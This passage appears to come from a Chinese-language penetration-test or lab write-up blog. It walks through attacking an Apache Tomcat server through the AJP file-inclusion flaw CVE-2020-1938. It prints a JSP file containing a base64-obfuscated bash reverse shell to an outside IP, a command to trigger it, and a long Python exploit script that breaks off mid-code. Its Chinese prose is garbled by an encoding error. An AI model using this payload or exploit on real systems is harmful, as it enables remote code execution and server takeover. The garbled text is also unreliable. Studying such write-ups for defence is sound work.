class="string">39.98.118.194:8080 open</span></span><br><span class="line"><span class="string">39.98.118.194:22 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 3</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://39.98.118.194:8080 code:200 len:7091   title:åå°ç®¡ç†</span></span><br></pre></td></tr></table></figure><p>dirsearchæ‰«æå‘ç°docsè·¯ç”±ï¼Œè®¿é—®å‘ç°ä¸ºtomcat 9.0.30ï¼Œåˆ©ç”¨å·¥å…·è¿›è¡Œæ‰«æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240805163537886.png" alt="image-20240805163537886"></p><p>å‘ç°å­˜åœ¨AJPæ¼æ´ï¼Œä½¿ç”¨Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938å°è¯•è·å–shellï¼Œå…ˆä¸Šä¼ æ–‡ä»¶ï¼Œå¾—åˆ°æ–‡ä»¶è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMTIzLjk2LzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240805164106771.png" alt="image-20240805164106771"></p><p>å†åˆ©ç”¨åŒ…å«è„šæœ¬åŒ…å«è¯¥æ–‡ä»¶è·å–shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2020-1938-shell.py 39.99.227.248 -p 8009 -f upload/fe84d72a6dbdfd1c109f449cc3dc6dc8/20240807012205164.txt</span><br></pre></td></tr></table></figure><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_string</span>(<span class="params">s</span>):</span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, -<span class="number">1</span>)</span><br><span class="line">l = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack</span>(<span class="params">stream, fmt</span>):</span><br><span class="line">size = struct.calcsize(fmt)</span><br><span class="line">buf = stream.read(size)</span><br><span class="line"><span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_string</span>(<span class="params">stream</span>):</span><br><span class="line">size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> size == -<span class="number">1</span>: <span class="comment"># null string</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotFoundException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpBodyRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">self.data_stream = data_stream</span><br><span class="line">self.data_len = data_len</span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">res += data</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data = self.serialize()</span><br><span class="line">socket.send(data)</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> <span class="built_in">len</span>(data) == <span class="number">4</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpForwardRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="built_in">range</span>(<span class="number">28</span>)</span><br><span class="line">REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line"><span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">]</span><br><span class="line">ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">self.prefix_code = <span class="number">0x02</span></span><br><span class="line">self.method = <span class="literal">None</span></span><br><span class="line">self.protocol = <span class="literal">None</span></span><br><span class="line">self.req_uri = <span class="literal">None</span></span><br><span class="line">self.remote_addr = <span class="literal">None</span></span><br><span class="line">self.remote_host = <span class="literal">None</span></span><br><span class="line">self.server_name = <span class="literal">None</span></span><br><span class="line">self.server_port = <span class="literal">None</span></span><br><span class="line">self.is_ssl = <span class="literal">None</span></span><br><span class="line">self.num_headers = <span class="literal">None</span></span><br><span class="line">self.request_headers = <span class="literal">None</span></span><br><span class="line">self.attributes = <span class="literal">None</span></span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_headers</span>(<span class="params">self</span>):</span><br><span class="line">self.num_headers = <span class="built_in">len</span>(self.request_headers)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.num_headers)</span><br><span class="line"><span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line"><span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">res += pack_string(self.request_headers[h_name])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_attributes</span>(<span class="params">self</span>):</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line"><span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">res += pack_string(aa_name)</span><br><span class="line">res += pack_string(a_value)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">res = struct.pack(<span class="string">&quot;bb&quot;</span>, self.prefix_code, self.method)</span><br><span class="line">res += pack_string(self.protocol)</span><br><span class="line">res += pack_string(self.req_uri)</span><br><span class="line">res += pack_string(self.remote_addr)</span><br><span class="line">res += pack_string(self.remote_host)</span><br><span class="line">res += pack_string(self.server_name)</span><br><span class="line">res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.server_port)</span><br><span class="line">res += struct.pack(<span class="string">&quot;?&quot;</span>, self.is_ssl)</span><br><span class="line">res += self.pack_headers()</span><br><span class="line">res += self.pack_attributes()</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, raw_packet</span>):</span><br><span class="line">stream = StringIO(raw_packet)</span><br><span class="line">self.magic1, self.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">self.prefix_code, self.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">self.protocol = unpack_string(stream)</span><br><span class="line">self.req_uri = unpack_string(stream)</span><br><span class="line">self.remote_addr = unpack_string(stream)</span><br><span class="line">self.remote_host = unpack_string(stream)</span><br><span class="line">self.server_name = unpack_string(stream)</span><br><span class="line">self.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">self.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.request_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.request_headers[h_name] = h_value</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=<span class="literal">False</span></span>):</span><br><span class="line">res = []</span><br><span class="line">i = socket.sendall(self.serialize())</span><br><span class="line"><span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">self.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># read body chunks and end response packets</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpResponse</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="built_in">range</span>(<span class="number">7</span>)</span><br><span class="line">COMMON_SEND_HEADERS = [</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line"><span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, stream</span>):</span><br><span class="line"><span class="comment"># read headers</span></span><br><span class="line">self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">self.parse_send_headers(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">self.parse_send_body_chunk(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">self.parse_end_response(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">self.parse_get_body_chunk(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_send_headers</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.http_status_msg = unpack_string(stream)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.response_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="number">0xA001</span>]</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_end_response</span>(<span class="params">self, stream</span>):</span><br><span class="line">self.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive</span>(<span class="params">stream</span>):</span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(stream)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span><br><span class="line">fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">fr.method = method</span><br><span class="line">fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">fr.req_uri = req_uri</span><br><span class="line">fr.remote_addr = target_host</span><br><span class="line">fr.remote_host = <span class="literal">None</span></span><br><span class="line">fr.server_name = target_host</span><br><span class="line">fr.server_port = <span class="number">80</span></span><br><span class="line">fr.request_headers = &#123;</span><br><span class="line"><span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line"><span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span 